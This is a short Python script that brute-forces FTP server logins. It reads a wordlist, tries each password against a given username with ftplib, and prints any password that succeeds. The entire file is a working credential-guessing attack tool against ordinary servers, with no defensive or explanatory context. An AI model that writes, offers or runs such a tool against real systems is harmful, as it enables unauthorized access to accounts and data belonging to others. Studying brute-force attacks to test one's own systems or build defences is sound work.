import ftplib
ftp_server = input("FTP Server:")
user = input("username: ")
wordlist = input("Path to password or wordlist:")
try:
    with open(wordlist,'r') as passwords:
        for word in passwords:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(ftp_server)
                ftp.login(user,word)
                print("Password is recovered!: "+word) 
            except ftplib.error_perm as ex:
                print('trying.... ', ex)
except Exception as ex:
    print('Error with Worldlist',ex)
        
